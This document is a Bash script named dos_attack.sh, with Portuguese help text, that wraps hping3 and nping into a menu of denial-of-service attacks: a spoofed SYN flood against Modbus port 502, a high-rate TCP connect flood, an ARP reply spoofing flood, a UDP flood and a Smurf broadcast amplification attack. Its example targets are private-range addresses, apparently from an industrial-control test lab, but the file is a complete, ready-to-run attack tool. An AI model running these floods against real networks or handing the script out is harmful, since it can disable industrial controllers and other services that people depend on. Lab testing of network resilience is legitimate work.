#!/bin/bash
# dos_attack.sh

ACTION=$1
shift  # remove o primeiro argumento, o resto são parâmetros do ataque

LOGFILE="dos_${ACTION}_$(date +%F_%H-%M).log"

show_help() {
    echo "Uso: $0 <ATAQUE> [ARGUMENTOS]"
    echo
    echo "Ataques disponíveis:"
    echo "  hping3_synflood   <IP_ALVO> [INTERFACE]"
    echo "      -> Flood TCP SYN spoofed contra porta 502 (Modbus)"
    echo
    echo "  nping_tcpflood    <IP_ALVO> [RATE] [COUNT]"
    echo "      -> Flood TCP SYN com tentativas de conexão real"
    echo
    echo "  nping_arp_spoof   <IP_ALVO> <SENDER_IP> <SENDER_MAC> [COUNT]"
    echo "      -> Flood ARP reply (camada 2 spoofing)"
    echo
    echo "  hping3_udpflood   <IP_ALVO> [INTERFACE]"
    echo "      -> Flood UDP volumétrico (porta 21)"
    echo
    echo "  hping3_smurf      <IP_VITIMA> <BROADCAST>"
    echo "      -> Smurf attack (ICMP broadcast amplification)"
    echo
    echo "Exemplos:"
    echo "  $0 hping3_synflood 172.27.224.250 eth0"
    echo "  $0 nping_tcpflood 172.27.224.250 90000 900000"
    echo "  $0 nping_arp_spoof 172.27.224.250 172.27.224.10 00:11:22:33:44:55 9999"
    echo "  $0 hping3_udpflood 172.27.224.250 eth0"
    echo "  $0 hping3_smurf 172.27.224.70 172.27.224.255"
}

case "$ACTION" in
    hping3_synflood)
        TARGET=$1
        INTERFACE=${2:-eth0}
        if [ -z "$TARGET" ]; then show_help; exit 1; fi
        echo "[+] Iniciando SYN flood com hping3 contra $TARGET..."
        sudo hping3 -I "$INTERFACE" -d 120 -S -P -w 64 -p 502 --flood --rand-source "$TARGET" \
          2>&1 | tee "$LOGFILE"
        ;;

    nping_tcpflood)
        TARGET=$1
        RATE=${2:-90000}
        COUNT=${3:-900000}
        if [ -z "$TARGET" ]; then show_help; exit 1; fi
        echo "[+] Iniciando TCP flood com nping contra $TARGET..."
        sudo nping --tcp-connect --flags syn --dest-port 502 --rate="$RATE" -c "$COUNT" -q "$TARGET" \
          2>&1 | tee "$LOGFILE"
        ;;

    nping_arp_spoof)
        TARGET=$1
        SENDER_IP=$2
        SENDER_MAC=$3
        COUNT=${4:-9999}
        if [ -z "$TARGET" ] || [ -z "$SENDER_IP" ] || [ -z "$SENDER_MAC" ]; then show_help; exit 1; fi
        echo "[+] Iniciando ARP spoof flood contra $TARGET..."
        sudo nping --arp-type ARP-reply --arp-sender-mac "$SENDER_MAC" --arp-sender-ip "$SENDER_IP" -c "$COUNT" "$TARGET" \
          2>&1 | tee "$LOGFILE"
        ;;

    hping3_udpflood)
        TARGET=$1
        INTERFACE=${2:-eth0}
        if [ -z "$TARGET" ]; then show_help; exit 1; fi
        echo "[+] Iniciando UDP flood contra $TARGET..."
        sudo hping3 -I "$INTERFACE" --udp --flood -n -q -d 110 -p 21 --rand-source "$TARGET" \
          2>&1 | tee "$LOGFILE"
        ;;

    hping3_smurf)
        VICTIM=$1
        BROADCAST=$2
        if [ -z "$VICTIM" ] || [ -z "$BROADCAST" ]; then show_help; exit 1; fi
        echo "[+] Iniciando Smurf attack contra $VICTIM via $BROADCAST..."
        sudo hping3 -1 --flood -a "$VICTIM" "$BROADCAST" \
          2>&1 | tee "$LOGFILE"
        ;;

    -h|--help|help|"")
        show_help
        ;;

    *)
        echo "Erro: ataque '$ACTION' não reconhecido."
        echo
        show_help
        exit 1
        ;;
esac
